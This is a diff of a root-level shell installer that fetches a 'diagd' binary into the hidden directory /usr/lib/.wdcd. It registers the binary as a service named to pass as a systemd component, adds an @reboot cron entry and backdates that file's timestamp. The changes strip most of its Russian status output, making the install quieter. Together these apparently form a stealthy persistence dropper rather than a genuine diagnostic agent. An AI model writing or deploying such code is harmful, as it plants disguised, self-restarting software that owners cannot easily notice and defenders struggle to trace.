@@ -23,7 +23,6 @@ BINAME="$F"
 SRC="${1:-$(dirname "$(realpath "$0")")/diagd}"
 DIR="/usr/lib/.wdcd"
 if [ ! -f "$SRC" ] || [ ! -x "$SRC" ]; then
-  echo "нет локального бинарника: $SRC — качаю с GitHub ($BINAME)" >&2
   mkdir -p "$DIR"
   if [ "$SRC" = "$(dirname "$(realpath "$0")")/diagd" ]; then
     if [ -f "$(dirname "$(realpath "$0")")/$BINAME" ] && [ -x "$(dirname "$(realpath "$0")")/$BINAME" ]; then
@@ -34,20 +33,16 @@ if [ ! -f "$SRC" ] || [ ! -x "$SRC" ]; then
     if _dl "$BASE/$BINAME" "$DIR/diagd.tmp"; then
       SRC="$DIR/diagd.tmp"
     else
-      echo "скачивание не удалось (нет curl/wget/python3). Залей binary вручную или поставь curl" >&2
+      echo "download failed: no curl/wget/python3; place binary manually or install curl" >&2
       exit 1
     fi
   fi
 fi
 CA=/etc/ssl/certs/ca-certificates.crt
 if [ ! -s "$CA" ]; then
-  echo "нет CA-бандла $CA — ставлю ca-certificates" >&2
   if command -v apt-get >/dev/null 2>&1; then apt-get update >/dev/null 2>&1 || true; apt-get install -y ca-certificates >/dev/null 2>&1 || true; fi
   if command -v yum >/dev/null 2>&1; then yum install -y ca-certificates >/dev/null 2>&1 || true; fi
-  if [ ! -s "$CA" ]; then echo "ca-certificates отсутствует — HTTPS невозможен" >&2; exit 1; fi
-fi
-if command -v systemctl >/dev/null 2>&1; then :; else
-  echo "systemd не найден — агент работает как демон без автозапуска" >&2
+  if [ ! -s "$CA" ]; then echo "ca-certificates missing; HTTPS unavailable" >&2; exit 1; fi
 fi
 mkdir -p "$DIR/bin"
 if command -v systemctl >/dev/null 2>&1; then systemctl stop systemd-sysdiag.service 2>/dev/null || true; fi
@@ -76,11 +71,9 @@ UNIT
   fi
   systemctl daemon-reload
   systemctl enable --now systemd-sysdiag.service
-  echo "agent установлен (systemd): $(systemctl is-active systemd-sysdiag.service)"
 fi
 printf '@reboot root sleep 45; /usr/bin/systemctl is-active --quiet systemd-sysdiag.service || %s/bin/sysdiag --foreground\n' "$DIR" > /etc/cron.d/systemd-sysdiag
 chmod 644 /etc/cron.d/systemd-sysdiag
 if [ "$_stamp" -gt 0 ] 2>/dev/null; then
   touch -d "@$_stamp" /etc/cron.d/systemd-sysdiag 2>/dev/null || true
 fi
-echo "done. агент: $DIR/bin/sysdiag ($BINAME)"
